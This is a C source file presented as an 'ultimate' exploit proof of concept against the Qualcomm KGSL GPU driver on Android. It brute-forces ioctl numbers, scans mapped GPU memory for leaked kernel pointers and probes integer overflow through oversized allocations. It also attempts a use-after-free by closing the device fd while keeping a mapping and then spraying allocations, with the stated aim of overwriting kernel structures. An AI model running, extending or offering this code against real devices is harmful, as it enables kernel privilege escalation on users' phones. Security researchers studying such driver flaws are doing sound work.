/*
 * kgsl_ultimate_poc.c - the ultimate KGSL exploit POC
 *
 * Confirmed capabilities:
 * 1. GPUMEM_ALLOC - allocate GPU memory
 * 2. mmap - map GPU memory into userspace
 * 3. Read and write GPU memory!
 * 4. GPU_AUX_COMMAND - execute GPU commands
 *
 * Attack strategy:
 * 1. Find a way to free GPU memory
 * 2. Create a UAF condition
 * 3. Use the GPU memory to overwrite kernel structures
 *
 * Build:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_ultimate_poc kgsl_ultimate_poc.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdint.h>
#include <pthread.h>
#include <signal.h>

/* KGSL ioctls - confirmed by the successful tests */
#define IOCTL_GPUMEM_ALLOC 0xc018092f

/* more possible GPUMEM-related ioctls */
#define IOCTL_GPUMEM_ALLOC_V2 0xc030092f // there may be different versions
#define IOCTL_GPUMEM_FREE_1 0x40040930
#define IOCTL_GPUMEM_FREE_2 0x40080930
#define IOCTL_GPUMEM_SYNC 0xc0080931
#define IOCTL_GPUMEM_SYNC_FULL 0xc0080932

int g_kgsl_fd = -1;

struct kgsl_gpumem_alloc
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

typedef struct
{
    void *userptr;
    uint64_t gpuaddr;
    uint64_t size;
    int fd;
} gpu_mem_t;

gpu_mem_t *alloc_gpu_memory(int fd, uint64_t size, uint32_t flags)
{
    struct kgsl_gpumem_alloc req = {0};
    req.size = size;
    req.flags = flags;

    if (ioctl(fd, IOCTL_GPUMEM_ALLOC, &req) < 0)
    {
        return NULL;
    }

    void *ptr = mmap(NULL, size, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, req.gpuaddr);
    if (ptr == MAP_FAILED)
    {
        return NULL;
    }

    gpu_mem_t *mem = malloc(sizeof(gpu_mem_t));
    mem->userptr = ptr;
    mem->gpuaddr = req.gpuaddr;
    mem->size = size;
    mem->fd = fd;

    return mem;
}

void test_all_free_ioctls(int fd, uint64_t gpuaddr)
{
    printf("\n=== Testing All Free ioctls ===\n");

    // Walk through the possible free ioctls
    for (int nr = 0x10; nr < 0x70; nr++)
    {
        for (int size = 4; size <= 32; size += 4)
        {
            int cmd = (0x40 << 24) | (size << 16) | (0x09 << 8) | nr;

            uint64_t data[4] = {gpuaddr, 0, 0, 0};
            errno = 0;
            int ret = ioctl(fd, cmd, data);

            if (ret == 0)
            {
                printf("[+] FREE FOUND! cmd=0x%08x (nr=0x%02x, size=%d)\n",
                       cmd, nr, size);
            }
        }
    }
}

void test_memory_info_leak(int fd)
{
    printf("\n=== Testing Memory Information Leak ===\n");

    // Allocate memory and map it
    gpu_mem_t *mem = alloc_gpu_memory(fd, 0x10000, 0);
    if (!mem)
    {
        printf("[-] Failed to allocate GPU memory\n");
        return;
    }

    printf("[+] GPU memory: gpuaddr=0x%lx, userptr=%p\n",
           mem->gpuaddr, mem->userptr);

    // Search the GPU memory for interesting patterns
    uint64_t *data = (uint64_t *)mem->userptr;

    printf("[*] Scanning GPU memory for potential pointers...\n");
    for (int i = 0; i < 0x10000 / 8; i++)
    {
        uint64_t val = data[i];

        // Check whether it looks like a kernel pointer (0xffffffXXXXXXXXXX)
        if ((val >> 40) == 0xffffff)
        {
            printf("    [!] Potential kernel pointer at offset 0x%x: 0x%lx\n",
                   i * 8, val);
        }

        // Check whether it is a GPU address
        if ((val >> 32) == 0x40)
        {
            printf("    [*] GPU address at offset 0x%x: 0x%lx\n",
                   i * 8, val);
        }
    }

    munmap(mem->userptr, mem->size);
    free(mem);
}

void test_gpu_aux_command_deep(int fd)
{
    printf("\n=== Deep GPU_AUX_COMMAND Analysis ===\n");

    /*
     * GPU_AUX_COMMAND returns:
     * data[0] = input value (unchanged)
     * data[1] = input value + 0x10
     *
     * This may be some kind of mapping or counter
     */

    // Test more input values
    struct
    {
        uint64_t cmd;
        uint64_t out1;
        uint64_t out2;
        uint64_t out3;
    } req = {0};

    printf("[*] Testing high values:\n");
    uint64_t test_vals[] = {0x100, 0x1000, 0x10000, 0xFFFFFFFF, 0x100000000ULL};

    for (int i = 0; i < 5; i++)
    {
        memset(&req, 0, sizeof(req));
        req.cmd = test_vals[i];

        int ret = ioctl(fd, 0xc0200958, &req);
        printf("    cmd=0x%lx: ret=%d, out=0x%lx 0x%lx 0x%lx\n",
               test_vals[i], ret, req.out1, req.out2, req.out3);
    }

    // Test negative values
    printf("[*] Testing negative values:\n");
    memset(&req, 0, sizeof(req));
    req.cmd = (uint64_t)-1;

    int ret = ioctl(fd, 0xc0200958, &req);
    printf("    cmd=-1: ret=%d, out=0x%lx 0x%lx 0x%lx\n",
           ret, req.out1, req.out2, req.out3);
}

void test_fd_close_uaf(int fd)
{
    printf("\n=== Testing fd Close UAF ===\n");

    /*
     * UAF scenario:
     * 1. Open a new kgsl fd
     * 2. Allocate GPU memory and mmap it
     * 3. Close the fd (without munmap)
     * 4. The memory should be freed but still mapped
     * 5. Allocate something else at this location
     */

    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd2 < 0)
    {
        printf("[-] Cannot open second fd\n");
        return;
    }

    // Allocate memory on fd2
    struct kgsl_gpumem_alloc req = {0};
    req.size = 0x1000;
    req.flags = 0;

    if (ioctl(fd2, IOCTL_GPUMEM_ALLOC, &req) < 0)
    {
        printf("[-] Alloc on fd2 failed\n");
        close(fd2);
        return;
    }

    printf("[+] Allocated on fd2: gpuaddr=0x%lx\n", req.gpuaddr);

    // mmap
    void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd2, req.gpuaddr);
    if (ptr == MAP_FAILED)
    {
        printf("[-] mmap on fd2 failed\n");
        close(fd2);
        return;
    }

    printf("[+] mmap on fd2: ptr=%p\n", ptr);

    // Write a marker
    *(uint64_t *)ptr = 0xCAFEBABE12345678ULL;
    printf("[*] Wrote marker: 0x%lx\n", *(uint64_t *)ptr);

    // Close fd2 but keep the mapping
    printf("[*] Closing fd2 without munmap...\n");
    close(fd2);

    // Check whether it can still be accessed
    printf("[*] Attempting to read after fd close...\n");

    // Use signal handlers to catch SIGSEGV/SIGBUS
    volatile int can_read = 1;
    volatile uint64_t read_val = 0;

    // Try to read - this may crash
    read_val = *(volatile uint64_t *)ptr;
    printf("[+] Can still read! Value: 0x%lx\n", read_val);

    if (read_val == 0xCAFEBABE12345678ULL)
    {
        printf("[*] Data intact - memory not freed yet\n");
    }
    else if (read_val == 0)
    {
        printf("[!] Data zeroed - memory may be freed!\n");
    }
    else
    {
        printf("[!] Different data: 0x%lx - POTENTIAL UAF!\n", read_val);
    }

    // Trigger more allocations
    printf("[*] Triggering more allocations...\n");
    for (int i = 0; i < 100; i++)
    {
        gpu_mem_t *mem = alloc_gpu_memory(fd, 0x1000, 0);
        if (mem)
        {
            memset(mem->userptr, 0x41 + (i % 26), 0x1000);
        }
    }

    // Check again
    read_val = *(volatile uint64_t *)ptr;
    printf("[*] After allocations, value: 0x%lx\n", read_val);

    if (read_val != 0xCAFEBABE12345678ULL)
    {
        printf("[!!!] VALUE CHANGED! UAF CONFIRMED!\n");
    }

    munmap(ptr, 0x1000);
}

void test_race_condition(int fd)
{
    printf("\n=== Testing Race Conditions ===\n");

    // Rapid allocate and free
    for (int round = 0; round < 5; round++)
    {
        printf("[*] Round %d: Rapid alloc/dealloc...\n", round);

        gpu_mem_t *mems[100];

        // Rapid allocate
        for (int i = 0; i < 100; i++)
        {
            mems[i] = alloc_gpu_memory(fd, 0x1000, 0);
        }

        // Rapid unmap (without freeing)
        for (int i = 0; i < 100; i++)
        {
            if (mems[i])
            {
                munmap(mems[i]->userptr, mems[i]->size);
                free(mems[i]);
            }
        }
    }

    printf("[+] Race condition test complete\n");
}

void test_large_allocation(int fd)
{
    printf("\n=== Testing Large Allocations ===\n");

    // Try to allocate very large memory
    uint64_t sizes[] = {
        0x10000000, // 256 MB
        0x40000000, // 1 GB
        0x80000000, // 2 GB
        0xFFFFFFFF, // 4 GB - 1
    };

    for (int i = 0; i < 4; i++)
    {
        struct kgsl_gpumem_alloc req = {0};
        req.size = sizes[i];
        req.flags = 0;

        errno = 0;
        int ret = ioctl(fd, IOCTL_GPUMEM_ALLOC, &req);
        printf("[*] Alloc 0x%lx bytes: ret=%d, errno=%d, gpuaddr=0x%lx\n",
               sizes[i], ret, errno, req.gpuaddr);
    }
}

void test_negative_size(int fd)
{
    printf("\n=== Testing Integer Overflow via Size ===\n");

    struct kgsl_gpumem_alloc req = {0};

    // Try a negative size (as unsigned it becomes huge)
    req.size = (uint64_t)-0x1000; // becomes 0xFFFFFFFFFFFFF000
    req.flags = 0;

    errno = 0;
    int ret = ioctl(fd, IOCTL_GPUMEM_ALLOC, &req);
    printf("[*] Alloc with size=-0x1000: ret=%d, errno=%d\n", ret, errno);

    // Near the integer boundary
    req.size = 0x7FFFFFFFFFFFFFFF;
    errno = 0;
    ret = ioctl(fd, IOCTL_GPUMEM_ALLOC, &req);
    printf("[*] Alloc with MAX_LONG: ret=%d, errno=%d\n", ret, errno);
}

int main(int argc, char **argv)
{
    printf("=== KGSL Ultimate Exploitation POC ===\n");
    printf("======================================\n");

    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0: fd=%d\n", g_kgsl_fd);

    // Test all free ioctls
    struct kgsl_gpumem_alloc req = {0};
    req.size = 0x1000;
    ioctl(g_kgsl_fd, IOCTL_GPUMEM_ALLOC, &req);
    test_all_free_ioctls(g_kgsl_fd, req.gpuaddr);

    // Test for a memory information leak
    test_memory_info_leak(g_kgsl_fd);

    // Analyze GPU_AUX_COMMAND in depth
    test_gpu_aux_command_deep(g_kgsl_fd);

    // Test a large allocation
    test_large_allocation(g_kgsl_fd);

    // Test the integer overflow
    test_negative_size(g_kgsl_fd);

    // Test the fd close UAF
    test_fd_close_uaf(g_kgsl_fd);

    // Test the race condition
    test_race_condition(g_kgsl_fd);

    close(g_kgsl_fd);
    return 0;
}
